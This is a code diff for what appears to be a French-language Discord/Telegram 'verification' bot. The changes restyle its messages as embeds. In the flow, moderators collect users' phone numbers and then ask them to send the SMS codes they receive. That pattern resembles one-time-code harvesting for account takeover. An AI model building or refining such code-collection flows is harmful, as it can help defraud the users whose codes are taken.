@@ -26,12 +26,13 @@ setInterval(async () => {
       const isTg = data.originGuildId === "tg";
       if (isTg) {
         if (tgBot) {
-          try { await tgBot.telegram.sendMessage(data.userId, "⏳ Aucun modérateur n'a pris ta demande pour le moment. Réessaie plus tard, un modérateur te prendra en charge dès que possible."); } catch {}
+          try { await tgBot.telegram.sendMessage(data.userId, "⏳ **File d'attente**\n\nAucun modérateur n'est disponible pour le moment.\nTa demande est bien enregistrée, tu seras notifié dès qu'un modérateur sera disponible.\n\n*Merci de patienter* 🙏"); } catch {}
         }
       } else {
         try {
           const u = await client.users.fetch(data.userId);
-          await u.send("⏳ Aucun modérateur n'a pris ta demande pour le moment. Réessaie plus tard, un modérateur te prendra en charge dès que possible.");
+          const waitEmbed = new EmbedBuilder().setTitle("⏳ File d'attente — Modération").setDescription("Aucun modérateur n'est disponible pour le moment.\n\nTa demande est bien enregistrée, tu seras notifié dès qu'un modérateur sera disponible.\n\n*Merci de patienter* 🙏").setColor(0xfaa61a).setTimestamp();
+          await u.send({ embeds: [waitEmbed] });
         } catch {}
       }
       // edit message modo : précise pas claim + bouton Prêt
@@ -890,7 +891,8 @@ client.on("interactionCreate", async (i) => {
       // force timeout immediat
       try {
         const u = await client.users.fetch(fakeUser.id);
-        await u.send("⏳ [TEST] Aucun modérateur n'a pris ta demande pour le moment. Réessaie plus tard.");
+        const testEmbed = new EmbedBuilder().setTitle("⏳ [TEST] File d'attente — Modération").setDescription("Aucun modérateur n'est disponible pour le moment.\n\nTa demande est bien enregistrée, tu seras notifié dès qu'un modérateur sera disponible.\n\n*Merci de patienter* 🙏").setColor(0xfaa61a).setTimestamp();
+        await u.send({ embeds: [testEmbed] });
       } catch {}
       const baseDesc = embed.description || "";
       const timeoutEmbed = new EmbedBuilder()
@@ -1389,13 +1391,15 @@ client.on("interactionCreate", async (i) => {
     }
     const isTg = originGuildId === "tg";
     const guildName = isTg ? "Telegram" : (await client.guilds.fetch(originGuildId).catch(()=>({name:"le serveur"}))).name;
-    const niceMsg = `✅ **Bonne nouvelle !**\n\nUn modérateur est enfin disponible pour votre vérification sur **${guildName}**.\nMerci de patienter, il va prendre en charge votre demande dans quelques instants et vous guider pour finaliser votre vérification.\n\nRestez à l'écoute !`;
+    const guildNameSafe = guildName || "le serveur";
+    const tgNice = `✅ **Bonne nouvelle !**\n\nUn modérateur est enfin disponible pour ta vérification sur **${guildNameSafe}**.\nIl va prendre en charge ta demande dans quelques instants.\n\n*Reste à l'écoute* 👀`;
+    const discordNiceEmbed = new EmbedBuilder().setTitle("✅ Modérateur disponible").setDescription(`Un modérateur est enfin disponible pour ta vérification sur **${guildNameSafe}**.\n\nIl va prendre en charge ta demande dans quelques instants et te guider.\n\n*Reste à l'écoute* 👀`).setColor(0x57f287).setTimestamp();
     try {
       if (isTg) {
-        if (tgBot) await tgBot.telegram.sendMessage(userId, niceMsg);
+        if (tgBot) await tgBot.telegram.sendMessage(userId, tgNice);
       } else {
         const u = await client.users.fetch(userId);
-        await u.send(niceMsg);
+        await u.send({ embeds: [discordNiceEmbed] });
       }
     } catch (e) {
       console.error("pret DM fail:", e.message);
@@ -1525,13 +1529,14 @@ client.on("interactionCreate", async (i) => {
     if (action === "validate") {
       if (!data.code) {
         if (originGuildId === "tg") {
-          notifyTelegram(userId, "✅ Vérification — Code SMS\n\nTon numéro est validé. Envoie ton code à 4 chiffres reçu par SMS :", true);
+          notifyTelegram(userId, "📱 **Numéro validé**\n\nTon numéro a été validé.\nEnvoie simplement ton code à 4 chiffres reçu par SMS directement ici en réponse.\n\n> Exemple: `1234`", true);
           await i.reply({ content: `📩 Message Telegram envoyé à ${userId}.` });
           return;
         }
         try {
           const u = await client.users.fetch(userId);
-          await u.send({ content: `Ton numéro ${formatPhone(data.phone)} est validé. Écris simplement ton code à 4 chiffres reçu par SMS directement ici en réponse (ex: 1234).` });
+          const codeEmbed = new EmbedBuilder().setTitle("📱 Numéro validé").setDescription(`Ton numéro \`${formatPhone(data.phone)}\` a été validé.\n\nEnvoie simplement ton code à **4 chiffres** reçu par SMS **directement ici** en réponse.\n\n> Exemple: \`1234\``).setColor(0x5865f2).setFooter({ text: "Ton code sera auto-supprimé après envoi" }).setTimestamp();
+          await u.send({ embeds: [codeEmbed] });
           await i.reply({ content: `📩 DM envoyé à <@${userId}> pour le code.` });
         } catch {
           await i.reply({ content: `Impossible de DM <@${userId}> (MP fermés).`, flags: MessageFlags.Ephemeral });
@@ -1562,7 +1567,8 @@ client.on("interactionCreate", async (i) => {
       }
       try {
         const u = await client.users.fetch(userId);
-        await u.send({ content: `Nouveau code demandé. Écris simplement ton code à 4 chiffres reçu par SMS directement ici en réponse (ex: 1234).` });
+        const resendEmbed = new EmbedBuilder().setTitle("🔄 Nouveau code demandé").setDescription(`Envoie simplement ton **nouveau code à 4 chiffres** reçu par SMS **directement ici** en réponse.\n\n> Exemple: \`1234\``).setColor(0x5865f2).setTimestamp();
+        await u.send({ embeds: [resendEmbed] });
         await i.reply({ content: `🔄 Code redemandé à <@${userId}>.` });
       } catch {
         await i.reply({ content: "DM impossible.", flags: MessageFlags.Ephemeral });
